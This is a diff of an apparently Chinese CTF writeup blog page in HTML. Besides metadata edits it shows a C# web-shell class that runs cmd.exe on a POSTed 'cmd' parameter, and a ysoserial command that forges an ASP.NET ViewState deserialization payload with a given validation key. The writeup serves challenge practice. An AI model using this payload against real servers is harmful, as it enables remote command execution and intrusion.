@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200327230333679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/202003272314208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-03-24T07:07:45.000Z">
-<meta property="article:modified_time" content="2020-03-29T10:31:51.810Z">
+<meta property="article:modified_time" content="2020-03-30T08:08:32.367Z">
 <meta property="article:author" content="penson">
 <meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
@@ -261,7 +261,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">3.9k字</span>
+      <span class="post-count">4k字</span>
     </span>
   </span>
 
@@ -415,10 +415,12 @@
 <p>看到参数，可以发现缺少ExploitClass.cs</p>
 <p>短文已给出相关payload：<br>复制到ExploitClass.cs文件就好</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class E</span><br><span class="line">&#123;</span><br><span class="line">    public E()</span><br><span class="line">    &#123;</span><br><span class="line">        System.Web.HttpContext context &#x3D; System.Web.HttpContext.Current;</span><br><span class="line">        context.Server.ClearError();</span><br><span class="line">        context.Response.Clear();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            System.Diagnostics.Process process &#x3D; new System.Diagnostics.Process();</span><br><span class="line">            process.StartInfo.FileName &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">            string cmd &#x3D; context.Request.Form[&quot;cmd&quot;];</span><br><span class="line">            process.StartInfo.Arguments &#x3D; &quot;&#x2F;c &quot; + cmd;</span><br><span class="line">            process.StartInfo.RedirectStandardOutput &#x3D; true;</span><br><span class="line">            process.StartInfo.RedirectStandardError &#x3D; true;</span><br><span class="line">            process.StartInfo.UseShellExecute &#x3D; false;</span><br><span class="line">            process.Start();</span><br><span class="line">            string output &#x3D; process.StandardOutput.ReadToEnd();</span><br><span class="line">            context.Response.Write(output);</span><br><span class="line">        &#125; catch (System.Exception) &#123;&#125;</span><br><span class="line">        context.Response.Flush();</span><br><span class="line">        context.Response.End();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>的出的密文传入<br>__VIEWSTATE</p>
+
+<p>最后需要引入的 dll 可以在安裝了 .NET Framework 的 Windows 主机上找到，文章中已给出相关路径</p>
 <p>最后的payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c &quot;ExploitClass.cs;.&#x2F;System.dll;.&#x2F;System.Web.dll&quot; --generator&#x3D;&quot;CA0B0334&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</span><br></pre></td></tr></table></figure>
 
+<p>得出的密文传入<br>__VIEWSTATE</p>
 <p>用postman进行传参就好<br>cmd指令:（与linux指令不一样）<br>dir 列出当前目录</p>
 <p>type 查看当前文件<br><img src="https://img-blog.csdnimg.cn/202003272314208.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvcFJvbWVv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 
